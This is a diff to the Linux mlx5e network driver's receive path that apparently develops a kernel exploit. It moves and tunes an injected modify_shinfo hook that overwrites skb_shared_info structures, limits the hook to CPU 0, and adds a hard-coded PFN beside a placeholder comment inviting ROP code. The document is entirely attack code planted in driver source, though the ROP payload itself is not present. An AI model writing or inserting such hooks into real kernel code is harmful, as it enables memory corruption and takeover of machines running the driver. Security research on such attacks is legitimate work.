@@ -215,6 +215,7 @@ static inline bool mlx5e_rx_cache_get(struct mlx5e_rq *rq,
 	return true;
 }
 
+#define PFN 33517752
 static inline void shared_info_write_page(char *base)
 {
 	/* Gil, write your ROP code magic here */
@@ -944,6 +945,8 @@ static inline void modify_shinfo(void *va, unsigned int frag_size)
 	//TODO: in my code there are magic offsets, I can recalculate them but this is easier
 
 	//TODO: make sure that build_skb rewrite tx_flags; the hook should be after it.
+	if (smp_processor_id() != 0)
+		return;
 	if (!gilkup_vars.injected && gilkup_vars.data_pointers_counter > 1000) //just in case...
 	{
 		struct skb_shared_info *shinfo = (struct skb_shared_info*)((u64)va + frag_size);
@@ -973,7 +976,6 @@ struct sk_buff *skb_from_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe,
 				      di->addr + wi->offset,
 				      0, frag_size,
 				      DMA_FROM_DEVICE);
-	modify_shinfo(va, frag_size);
 	prefetch(data);
 	wi->offset += frag_size;
 
@@ -994,6 +996,7 @@ struct sk_buff *skb_from_cqe(struct mlx5e_rq *rq, struct mlx5_cqe64 *cqe,
 		return NULL;
 	}
 
+	modify_shinfo(va, frag_size);
 	/* queue up for recycling/reuse */
 	page_ref_inc(di->page);
 
